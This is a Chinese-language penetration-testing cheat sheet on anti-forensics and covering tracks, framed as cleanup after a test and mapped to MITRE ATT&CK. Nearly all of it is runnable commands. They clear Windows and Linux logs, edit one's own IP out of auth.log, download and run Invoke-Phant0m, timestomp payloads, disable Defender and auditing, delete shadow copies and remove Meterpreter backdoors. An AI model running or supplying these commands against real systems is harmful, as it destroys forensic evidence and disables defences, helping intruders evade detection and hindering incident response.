---
id: 08-001
title: "🧹 痕迹清除 (Covering Tracks / Anti-Forensics)"
category: 痕迹清除
category_en: "Covering Tracks"
difficulty: ★★★
tools: "日志清除, 文件隐藏, 时间戳修改, 反取证技术"
last_updated: 2025-07
tags: ["covering-tracks", "anti-forensics", "process-injection", "obfuscation"]
subdomain: covering-tracks
nist_csf: ["DE.CM-01", "PR.PT-01"]
mitre_attack: ["T1070", "T1562", "T1055", "T1027"]
---
# 🧹 痕迹清除 (Covering Tracks / Anti-Forensics)

## 概述
渗透测试完成后清除操作痕迹，包括日志清理、时间戳修改、文件删除恢复防护等，降低被检测和追踪的风险。

## 核心技能

### 1. Windows事件日志清除

```powershell
# 清除全部日志
wevtutil cl Application
wevtutil cl Security
wevtutil cl System
wevtutil cl Setup
wevtutil cl ForwardedEvents

# Windows PowerShell日志
wevtutil cl "Windows PowerShell"
wevtutil cl "Microsoft-Windows-PowerShell/Operational"

# RDP日志
wevtutil cl "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational"
wevtutil cl "Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational"

# 指定时间范围清除（使用PowerShell）
# 清除指定日期之前的日志
$log = Get-WmiObject -Class Win32_NTEventlogFile -Filter "LogFileName='Security'"
$log.Clear()
# 或使用wevtutil按时间清除（不支持直接按时间，需用API）

# 使用Mimikatz清除日志
mimikatz.exe "privilege::debug" "event::drop" "exit"

# 使用Invoke-Phant0m
powershell -Exec Bypass -C "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/master/Invoke-Phant0m.ps1'); Invoke-Phant0m"

# 清除特定用户/事件ID的日志
# 使用WinAPI枚举和删除
$eventLog = [System.Diagnostics.EventLog]::GetEventLogs() | Where-Object {$_.Log -eq "Security"}
foreach ($event in $eventLog.Entries) {
    if ($event.InstanceId -eq 4624) {  # 登录事件
        # 操作日志
    }
}
```

### 2. Linux日志清除

```bash
# 清除日志文件
# 清空关键日志
> /var/log/auth.log
> /var/log/syslog
> /var/log/messages
> /var/log/kern.log
> /var/log/secure
> /var/log/maillog
> /var/log/httpd/access_log
> /var/log/httpd/error_log
> /var/log/apache2/access.log
> /var/log/apache2/error.log
> /var/log/nginx/access.log
> /var/log/nginx/error.log

# 删除特定行（包含自己IP的行）
grep -v "YOUR_IP" /var/log/auth.log > /tmp/clean.log && mv /tmp/clean.log /var/log/auth.log

# 使用sed删除时间范围
sed -i '/2024-01-15 10:00/,/2024-01-15 11:00/d' /var/log/auth.log

# 清除bash历史
> ~/.bash_history
> ~/.zsh_history
history -c  # 清理当前会话历史
# 禁用历史记录（在shell退出时不保存）
unset HISTFILE
# 或设置HISTSIZE为0
export HISTSIZE=0

# 清除命令记录
# 在命令前加空格（需要设置HISTCONTROL=ignorespace）
# 例如:  ls（空格在开头）
```

### 3. 文件操作痕迹清除

```powershell
# Windows文件彻底删除
# 覆盖后删除
cipher /w:C:\           # 覆写未使用空间
sdelete -p 3 C:\temp\payload.exe  # Sysinternals SDelete, 3次覆盖

# 使用PowerShell覆盖
$file = "C:\temp\payload.exe"
$stream = [System.IO.File]::OpenWrite($file)
$data = New-Object Byte[] ($stream.Length)
# 随机数据覆盖
$rng = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
$rng.GetBytes($data)
$stream.Write($data, 0, $data.Length)
$stream.Close()
Remove-Item $file -Force

# 清除文件访问痕迹
# 删除Prefetch文件
Remove-Item "C:\Windows\Prefetch\*" -Force -ErrorAction SilentlyContinue

# 删除Recent文档
Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -ErrorAction SilentlyContinue

# 清除剪贴板
Set-Clipboard -Value ""

# 清除跳转列表
Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations\*" -Force

# 清除AppCompat缓存（程序兼容性缓存，记录程序执行）
# 需要SeTcbPrivilege
```

```bash
# Linux文件安全删除
# shred - 多次覆盖删除
shred -z -u -n 7 payload.sh     # 7次随机覆盖 + 0覆盖 + 删除
shred -z -u -n 35 secret.txt    # DoD标准35次覆盖

# wipe
wipe -r -f /tmp/payloads/

# dd覆盖
dd if=/dev/urandom of=/tmp/payload.sh bs=1M count=10

# 使用scrub
scrub -p dod /tmp/secret.txt

# 删除inode（无法恢复）
ext4magic  # 需要特殊工具

# 删除文件时覆盖文件系统日志
# 对于ext4文件系统，删除的文件块可能会被保留在日志中
```

### 4. 时间戳修改

```powershell
# Windows时间戳修改
# 使用PowerShell
$file = "C:\Windows\System32\legit.dll"
$modified = Get-Item $file | Select-Object -ExpandProperty LastWriteTime
$accessed = Get-Item $file | Select-Object -ExpandProperty LastAccessTime
$created = Get-Item $file | Select-Object -ExpandProperty CreationTime

# 将payload的时间戳修改为与系统文件相同
$payload = Get-Item "C:\temp\payload.exe"
$payload.CreationTime = $created
$payload.LastWriteTime = $modified
$payload.LastAccessTime = $accessed
```

```bash
# Linux时间戳修改
# touch - 修改访问和修改时间
touch -t 202301010000 payload.sh   # 设置为2023-01-01 00:00
touch -r /bin/ls payload.sh        # 设置为与/bin/ls相同的时间

# 递归修改目录时间戳
touch -t 202001010000.00 -r /bin/ls -d /tmp/hidden_dir/

# 修改文件的atime, mtime, ctime
# atime - 最后访问时间
# mtime - 最后修改时间
# ctime - 状态改变时间

# 使用faketime（需要root）
faketime '2023-01-01 00:00:00' touch payload.sh
```

### 5. 网络连接痕迹清除

```bash
# 清除ARP缓存
# Windows
arp -d *

# Linux
ip neigh flush all
arp -d 10.0.0.1  # 删除特定条目

# 清除DNS缓存
# Windows
ipconfig /flushdns

# Linux (systemd-resolved)
systemd-resolve --flush-caches

# Linux (nscd)
nscd -i hosts

# 清除NetBIOS名称缓存
# Windows
nbtstat -R

# 清除路由表
# 删除添加的路由
route delete 10.0.0.0

# 清除连接跟踪（Linux）
conntrack -D

# 清除浏览器缓存
# Windows: RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 255
RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 255
```

### 6. 反取证技术

```powershell
# 关闭审计策略
# Windows
auditpol /clear /y

# 禁用Windows Defender实时监控
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true

# 篡改时间线（Memory Artifacts）
# 清除内存中的证据痕迹
# 重启可清除大部分内存证据

# 禁用系统还原
Disable-ComputerRestore -Drive "C:\"

# 清除卷影副本（Shadow Copies）
vssadmin delete shadows /all /quiet
wmic shadowcopy delete

# 清除漏洞利用痕迹
# 清除ETW日志
wevtutil cl "Microsoft-Windows-Kernel-Process/Operational"
```

```bash
# Linux反取证
# 禁用内核审计
auditctl -e 0
systemctl stop auditd

# 清除syslog
service rsyslog stop
> /var/log/syslog

# 清除内核环形缓冲区
echo 0 > /proc/sys/kernel/printk

# 禁用命令日志
# 使用未设置HISTFILE的shell
SHELL=$(which bash) HISTFILE=/dev/null bash

# 使用内存文件系统
mount -t tmpfs -o size=50M tmpfs /tmp/secret_ops

# 隐藏进程
# 使用LD_PRELOAD劫持readdir等函数
# 或使用Rootkit技术
```

### 7. MSF/Meterpreter痕迹清理

```msf
# 清除Meterpreter日志
meterpreter > clearev    # 清除事件日志

# 删除上传文件
meterpreter > rm C:\\Windows\\Temp\\payload.exe

# 清除注册表痕迹
meterpreter > reg deletekey -k HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run -v Backdoor

# 删除创建的用户
meterpreter > execute -f net -a "user hacker /delete"
meterpreter > execute -f net -a "localgroup administrators hacker /delete"

# 清除网络共享
meterpreter > execute -f net -a "share backdoor /delete"

# 关闭进程
meterpreter > kill PID_OF_METERPRETER
```

## 痕迹清除检查清单

| 项目 | Windows | Linux |
|:---|:---|:---|
| 事件日志 | wevtutil cl | > /var/log/*.log |
| 命令历史 | doskey /listsize=0 | rm ~/.bash_history |
| 最近文件 | Recent文件夹 | 无（取决于DE） |
| 临时文件 | %TEMP% | /tmp |
| DNS缓存 | ipconfig /flushdns | systemd-resolve --flush-caches |
| 剪贴板 | Set-Clipboard "" | xclip -i /dev/null |
| 卷影副本 | vssadmin delete shadows | 无 |
| Prefetch | C:\Windows\Prefetch | 无 |
| 跳转列表 | Recent\AutomaticDestinations | 无 |

## 常用工具

| 工具 | 用途 | 链接 |
|:---|:---|:---|
| SDelete | 安全删除（Sysinternals） | https://learn.microsoft.com/en-us/sysinternals/downloads/sdelete |
| Invoke-Phant0m | 事件日志禁用 | https://github.com/hlldz/Invoke-Phant0m |
| Meterpreter clearev | 事件日志清除 | Metasploit内置 |
| CCleaner | 系统清理（商业） | https://www.ccleaner.com/ |
| BleachBit | 开源系统清理 | https://www.bleachbit.org/ |

## 参考资源
- [MITRE ATT&CK - Defense Evasion](https://attack.mitre.org/tactics/TA0005/)
- [Anti-Forensic Techniques](https://resources.infosecinstitute.com/topics/anti-forensics-techniques/)
- [HackTricks - Clearing Logs](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/clearing-logs)
- [SANS - Anti-Forensics](https://www.sans.org/white-papers/2325/)
